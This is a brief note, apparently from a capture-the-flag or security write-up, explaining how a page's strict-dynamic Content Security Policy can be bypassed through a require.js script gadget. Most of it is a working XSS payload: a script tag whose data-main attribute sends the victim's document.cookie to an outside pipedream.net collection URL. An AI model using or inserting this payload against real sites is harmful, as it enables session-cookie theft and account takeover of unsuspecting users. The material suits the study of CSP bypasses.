The page has strict-dynamic and a nonce. 
It loads multiple js libraries which have gadgets we can use to perform XSS.

The following gadget from require.js works:
```html
<script data-main="data:1, window.location.href='https://enh7hgfvq4ko6.x.pipedream.net?' + document.cookie" src='require.js'></script>
```